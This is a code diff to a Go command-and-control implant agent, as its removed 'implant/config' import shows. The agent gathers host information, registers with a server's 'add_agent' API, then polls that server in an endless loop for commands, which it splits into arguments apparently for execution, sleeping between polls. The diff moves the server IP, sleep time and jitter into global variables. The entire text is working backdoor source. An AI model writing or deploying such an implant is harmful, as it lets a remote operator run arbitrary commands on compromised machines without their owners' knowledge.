@@ -4,15 +4,21 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"implant/config"
 	"io/ioutil"
 	"net/http"
 	"os/exec"
+	"strconv"
 	"strings"
 	"time"
 
 	"github.com/shirou/gopsutil/host"
 	"github.com/shirou/gopsutil/mem"
+)
+
+var (
+	IP        = "127.0.0.1"
+	SleepTime = "0"
+	Jitter    = "0"
 )
 
 type system_info struct {
@@ -37,6 +43,7 @@ func register(serverIP string) string {
 	}
 	postBody, _ := json.Marshal(host_info)
 	responseBody := bytes.NewBuffer(postBody)
+	fmt.Printf("%s", serverIP)
 	resp_register, _ := http.Post("http://"+serverIP+":5000/api/1.1/add_agent", "application/json", responseBody)
 	body2, _ := ioutil.ReadAll(resp_register.Body)
 	fmt.Printf("%s", body2)
@@ -44,7 +51,7 @@ func register(serverIP string) string {
 	return agent_id
 }
 
-func get_command(agent_id string, serverIP string) {
+func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 	post_body, _ := json.Marshal(map[string]string{
 		"id": agent_id,
 	})
@@ -55,7 +62,7 @@ func get_command(agent_id string, serverIP string) {
 	tokens := strings.Split(out, ",")
 	command := tokens[0]
 	if command == "None" {
-		time.Sleep(1 * time.Second)
+		time.Sleep(sleepTime * time.Second)
 	} else {
 		commandID := tokens[1]
 		args := strings.Split(command, " ")
@@ -77,12 +84,10 @@ func get_command(agent_id string, serverIP string) {
 }
 
 func main() {
-	init := config.Config_t{IP: "127.0.0.1"}
-	var conf *config.Config_t = &init
-	res := config.CONFIG_BUFFER
-	config.Config_initialize(conf, res)
-	agent_id := register(conf.IP)
+	agent_id := register(IP)
+	time_int, _ := strconv.Atoi(SleepTime)
+	time_dur := time.Duration(time_int)
 	for {
-		get_command(agent_id, conf.IP)
+		get_command(agent_id, IP, time_dur)
 	}
 }
